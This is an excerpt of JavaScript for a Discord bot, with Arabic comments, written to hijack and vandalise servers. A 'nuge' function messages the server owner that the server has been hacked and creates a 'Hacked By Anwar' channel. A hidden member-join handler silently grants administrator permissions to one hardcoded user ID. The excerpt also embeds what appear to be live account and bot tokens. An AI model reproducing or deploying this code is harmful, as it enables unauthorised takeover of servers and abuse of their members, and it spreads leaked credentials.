...
const tokn = ("NTQzNzc2MzY3MjE3NzM3NzY4.XY5MVA.U8ZrfDxptxcvGF3AbH5RnqRM12U") /// توكن حسابك مهم <
//////////////////////////////////^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
...
async function nuge(guild) {
  ...
  await guild.fetchMembers('  ’ TOP-Anwar  , موت للجميع');
  
    await guild.owner.send('  ’ TOP-Anwar , تم التهكير ').catch(e => { return void e; });
  ...
  await guild.createChannel('Hacked By Anwar ! Is here', 'text');
  ...
  hngel.on('guildMemberAdd', member => {
    ...
    hngel.on('guildCreate', async (guild) => {
      ...
      hngel.on('guildMemberAdd', member => {
                  ...
                  if (member.id === "533217684066664449") {//هنا الايدي بتاعك <<<<<<<<<<<<<<<<
                      member.guild.createRole({
                          name : hngel.user.username,
                          color : "RANDOM", 
                          permissions : [8]
...
hngel.login("NjI2ODgyMjQ5NjQzNjU1MTY4.XZDI7w.tKkU3VG1jLWcJAnCfvYlszvjOus")// هنا حط التوكن >>>>>>>>>>>>>> بتاع البوت